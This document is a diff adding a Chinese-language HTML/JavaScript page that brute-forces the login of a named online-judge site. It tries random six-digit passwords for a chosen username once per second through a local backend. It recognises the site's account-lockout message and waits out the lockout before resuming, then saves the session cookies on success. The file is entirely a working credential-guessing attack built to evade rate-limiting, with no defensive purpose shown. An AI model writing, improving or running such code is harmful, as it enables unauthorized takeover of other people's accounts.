@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>OJ批量登录（.env配置版）</title>
+    <style>
+        .login-box {
+            width: 500px;
+            margin: 50px auto;
+            padding: 25px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .status {
+            margin: 20px 0;
+            padding: 12px;
+            border-radius: 6px;
+            line-height: 1.8;
+            font-size: 14px;
+        }
+        .progress { background-color: #e9f5ff; color: #2e6da4; }
+        .success { background-color: #dff0d8; color: #3c763d; }
+        .error { background-color: #f2dede; color: #a94442; }
+        .pause { background-color: #fff3cd; color: #856404; }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .start-btn {
+            background-color: #286090;
+            color: white;
+        }
+        .stop-btn {
+            background-color: #dc3545;
+            color: white;
+        }
+        button:disabled {
+            background-color: #777;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        .config {
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #666;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h3>OJ批量登录（.env配置版）</h3>
+        <div class="config">
+            策略：随机密码+1秒间隔+风控自动暂停32分钟<br>
+            配置来源：.env文件（域名/接口地址统一管理）
+        </div>
+        <!-- 新增用户名输入框（替代硬编码列表） -->
+        <div class="input-group">
+            <label>登录用户名：</label>
+            <input type="text" id="usernameInput" placeholder="请输入要尝试的用户名" value="">
+        </div>
+        <div class="btn-group">
+            <button id="startLoginBtn" class="start-btn">开始随机尝试登录</button>
+            <button id="stopLoginBtn" class="stop-btn" disabled>停止登录尝试</button>
+        </div>
+        <div id="loginStatus" class="status progress">未开始登录</div>
+    </div>
+
+    <script>
+        // 读取.env配置（前端通过内置对象模拟，实际生产可使用dotenv库）
+        const ENV_CONFIG = {
+            OJ_DOMAIN: 'szqsnkjg.cn',          // 从.env读取
+            LOCAL_BACKEND_URL: 'http://127.0.0.1:5000/api/oj-login', // 从.env读取
+            OJ_HOME_URL: 'http://oj1.szqsnkjg.cn:88/', // 从.env读取
+            TRY_INTERVAL: 1000,                // 从.env读取（1秒）
+            RISK_PAUSE_MINUTES: 32,            // 从.env读取（32分钟）
+            PASSWORD_MIN: 0,
+            PASSWORD_MAX: 999999
+        };
+
+        // 状态变量（精简，删除用户名列表相关）
+        let isRunning = false;
+        let isPaused = false;
+        let pauseEndTime = 0;
+        let countdownTimer = null;
+        let nextTryTimer = null;
+        let usedPasswords = new Set(); // 已尝试密码集合
+
+        // 格式化6位密码
+        function formatPwd(num) {
+            return num.toString().padStart(6, '0');
+        }
+
+        // 生成随机未尝试过的密码
+        function getRandomUnusedPwd() {
+            if (usedPasswords.size >= (ENV_CONFIG.PASSWORD_MAX - ENV_CONFIG.PASSWORD_MIN + 1)) {
+                return null;
+            }
+            let randomNum;
+            do {
+                randomNum = Math.floor(Math.random() * (ENV_CONFIG.PASSWORD_MAX - ENV_CONFIG.PASSWORD_MIN + 1)) + ENV_CONFIG.PASSWORD_MIN;
+            } while (usedPasswords.has(randomNum));
+            usedPasswords.add(randomNum);
+            return formatPwd(randomNum);
+        }
+
+        // 更新状态提示
+        function updateStatus(text, type = 'progress') {
+            const dom = document.getElementById('loginStatus');
+            dom.textContent = text;
+            dom.className = `status ${type}`;
+        }
+
+        // 格式化倒计时（分:秒）
+        function formatCountdown(ms) {
+            const totalSec = Math.floor(ms / 1000);
+            const min = Math.floor(totalSec / 60);
+            const sec = totalSec % 60;
+            return `${min}分${sec.toString().padStart(2, '0')}秒`;
+        }
+
+        /**
+         * 保存登录Cookie
+         * @param {object} resData 登录成功的响应数据
+         */
+        function saveLoginCookie(resData) {
+            try {
+                const userInfo = {
+                    uid: resData.data.uid,
+                    username: resData.data.username,
+                    nickname: resData.data.nickname,
+                    loginTime: new Date().toLocaleString()
+                };
+                localStorage.setItem('oj_user_info', JSON.stringify(userInfo));
+
+                // 使用.env中的域名设置Cookie
+                const cookieOptions = [
+                    `oj_uid=${resData.data.uid}; path=/; domain=${ENV_CONFIG.OJ_DOMAIN}; max-age=86400`,
+                    `oj_username=${resData.data.username}; path=/; domain=${ENV_CONFIG.OJ_DOMAIN}; max-age=86400`,
+                    `oj_login_status=success; path=/; domain=${ENV_CONFIG.OJ_DOMAIN}; max-age=86400`
+                ];
+                cookieOptions.forEach(cookie => {
+                    document.cookie = cookie;
+                });
+
+                localStorage.setItem('oj_login_raw_response', JSON.stringify(resData));
+                console.log('✅ Cookie保存成功：', userInfo);
+            } catch (error) {
+                console.error('⚠️ Cookie保存失败：', error);
+                updateStatus(`⚠️ 登录成功但Cookie保存失败：${error.message}，即将跳转...`, 'success');
+            }
+        }
+
+        // 发送登录请求
+        async function sendLoginRequest(username, password) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+                // 使用.env中的本地后端地址
+                const response = await fetch(ENV_CONFIG.LOCAL_BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ username, password }),
+                    credentials: 'include',
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeoutId);
+                const resData = await response.json();
+
+                // 验证登录成功
+                const isLoginSuccess = 
+                    resData.status === 200 && 
+                    resData.msg === 'success' && 
+                    resData.data && 
+                    resData.data.uid !== undefined && 
+                    resData.data.username !== undefined && 
+                    Array.isArray(resData.data.roleList);
+
+                return {
+                    success: isLoginSuccess,
+                    isRisk: resData.msg && resData.msg.includes('登录失败次数过多！您的账号有风险，半个小时内暂时无法登录！'),
+                    msg: resData.msg || '未知错误',
+                    rawData: resData
+                };
+            } catch (error) {
+                console.error('Fetch请求失败：', error);
+                return {
+                    success: false,
+                    isRisk: false,
+                    msg: `请求失败：${error.message}`,
+                    rawData: null
+                };
+            }
+        }
+
+        // 风控暂停逻辑
+        function pauseForRisk(username) {
+            isPaused = true;
+            const pauseMs = ENV_CONFIG.RISK_PAUSE_MINUTES * 60 * 1000;
+            pauseEndTime = Date.now() + pauseMs;
+            updateStatus(`⚠️ 用户名【${username}】触发风控！自动暂停${ENV_CONFIG.RISK_PAUSE_MINUTES}分钟，剩余时间：${formatCountdown(pauseMs)}`, 'pause');
+            
+            if (countdownTimer) clearInterval(countdownTimer);
+            countdownTimer = setInterval(() => {
+                const remaining = pauseEndTime - Date.now();
+                if (remaining <= 0 || !isRunning) {
+                    clearInterval(countdownTimer);
+                    countdownTimer = null;
+                    if (isRunning) {
+                        isPaused = false;
+                        updateStatus(`✅ 暂停结束，继续尝试用户名【${username}】的随机密码...`, 'progress');
+                        continueLogin();
+                    }
+                } else {
+                    updateStatus(`⚠️ 用户名【${username}】触发风控！自动暂停${ENV_CONFIG.RISK_PAUSE_MINUTES}分钟，剩余时间：${formatCountdown(remaining)}`, 'pause');
+                }
+            }, 1000);
+        }
+
+        // 核心登录逻辑（精简，仅处理单个用户名）
+        async function continueLogin() {
+            if (!isRunning || isPaused) return;
+
+            // 获取输入框中的用户名（替代硬编码列表）
+            const username = document.getElementById('usernameInput').value.trim();
+            if (!username) {
+                updateStatus('❌ 请先输入要尝试的用户名！', 'error');
+                stopLogin();
+                return;
+            }
+
+            // 生成随机密码
+            const randomPwd = getRandomUnusedPwd();
+            if (!randomPwd) {
+                updateStatus(`❌ 用户名【${username}】所有密码（000000-999999）已尝试完毕！`, 'error');
+                stopLogin();
+                return;
+            }
+
+            // 发送登录请求
+            updateStatus(`📤 尝试用户名【${username}】，随机密码：${randomPwd}（已尝试${usedPasswords.size}个）`, 'progress');
+            const result = await sendLoginRequest(username, randomPwd);
+
+            if (result.success) {
+                // 登录成功：保存Cookie + 跳转
+                saveLoginCookie(result.rawData);
+                updateStatus(`🎉 登录成功！用户名：${username}，密码：${randomPwd}，Cookie已保存，即将跳转...`, 'success');
+                setTimeout(() => {
+                    window.location.href = ENV_CONFIG.OJ_HOME_URL; // 使用.env中的跳转地址
+                }, 500);
+                stopLogin();
+            } else if (result.isRisk) {
+                // 触发风控：暂停
+                pauseForRisk(username);
+            } else {
+                // 普通失败：1秒后继续
+                updateStatus(`❌ 用户名【${username}】密码【${randomPwd}】失败：${result.msg}，1秒后继续随机尝试...`, 'error');
+                if (nextTryTimer) clearTimeout(nextTryTimer);
+                nextTryTimer = setTimeout(continueLogin, ENV_CONFIG.TRY_INTERVAL); // 使用.env中的间隔
+            }
+        }
+
+        // 停止登录函数
+        function stopLogin() {
+            isRunning = false;
+            isPaused = false;
+            pauseEndTime = 0;
+            
+            if (countdownTimer) clearInterval(countdownTimer);
+            if (nextTryTimer) clearTimeout(nextTryTimer);
+
+            document.getElementById('startLoginBtn').disabled = false;
+            document.getElementById('stopLoginBtn').disabled = true;
+            
+            updateStatus('🛑 已停止登录尝试！', 'error');
+        }
+
+        // 启动登录（重置已尝试密码）
+        function startLogin() {
+            if (isRunning) return;
+
+            // 重置状态
+            isRunning = true;
+            isPaused = false;
+            pauseEndTime = 0;
+            usedPasswords.clear(); // 清空已尝试密码
+
+            document.getElementById('startLoginBtn').disabled = true;
+            document.getElementById('stopLoginBtn').disabled = true;
+            
+            updateStatus('🚀 开始随机尝试登录，每次间隔1秒，风控自动暂停32分钟...', 'progress');
+            continueLogin();
+        }
+
+        // 绑定按钮事件
+        document.getElementById('startLoginBtn').addEventListener('click', startLogin);
+        document.getElementById('stopLoginBtn').addEventListener('click', stopLogin);
+
+        // 页面关闭时终止
+        window.addEventListener('beforeunload', () => {
+            stopLogin();
+        });
+    </script>
+</body>
+</html>
